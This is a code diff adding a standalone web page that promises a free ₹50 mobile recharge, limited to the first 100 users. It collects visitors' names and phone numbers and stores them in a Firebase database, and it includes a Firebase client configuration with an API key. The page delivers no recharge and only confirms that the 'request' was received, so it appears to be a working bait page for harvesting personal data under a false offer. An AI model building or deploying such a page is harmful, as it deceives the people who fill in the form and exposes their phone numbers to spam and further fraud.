@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Free Recharge Offer</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      background: linear-gradient(to right, #1CB5E0, #000046);
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      background-color: rgba(0, 0, 0, 0.6);
+      padding: 30px 40px;
+      border-radius: 20px;
+      box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
+      text-align: center;
+      width: 90%;
+      max-width: 400px;
+    }
+
+    .container h2 {
+      margin-bottom: 20px;
+      color: #00FFEA;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 10px;
+      font-size: 16px;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #00FFEA;
+      color: #000;
+      border: none;
+      font-size: 18px;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    button:hover {
+      background-color: #00cfcf;
+    }
+
+    .note {
+      font-size: 14px;
+      margin-top: 10px;
+      color: #ccc;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Free ₹50 Recharge Offer</h2>
+    <form id="userForm">
+      <input type="text" id="name" placeholder="Enter your name" required>
+      <input type="tel" id="phone" placeholder="Enter your phone number" required pattern="[0-9]{10}">
+      <button type="submit">Claim Now</button>
+    </form>
+    <div class="note">* Limited time offer. Valid for first 100 users only.</div>
+  </div>
+
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
+
+  <script>
+    // Firebase config
+    const firebaseConfig = {
+      apiKey: "AIzaSyC_VVy_C8uMT7Ab16NSS519kLmEbIHurtlo",
+      authDomain: "userformdata-9862a.firebaseapp.com",
+      projectId: "userformdata-9862a",
+      storageBucket: "userformdata-9862a.appspot.com",
+      messagingSenderId: "1064201048940",
+      appId: "1:1064201048940:web:c2f6ec583fc00b3a89949",
+      measurementId: "G-VLRKBYNZWJ",
+      databaseURL: "https://userformdata-9862a-default-rtdb.firebaseio.com"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
+    // Form submit handler
+    document.getElementById("userForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+      const name = document.getElementById("name").value;
+      const phone = document.getElementById("phone").value;
+
+      // Push data to Firebase
+      database.ref("offers").push({
+        name: name,
+        phone: phone
+      });
+
+      alert("Your recharge request has been received!");
+      document.getElementById("userForm").reset();
+    });
+  </script>
+</body>
+</html>
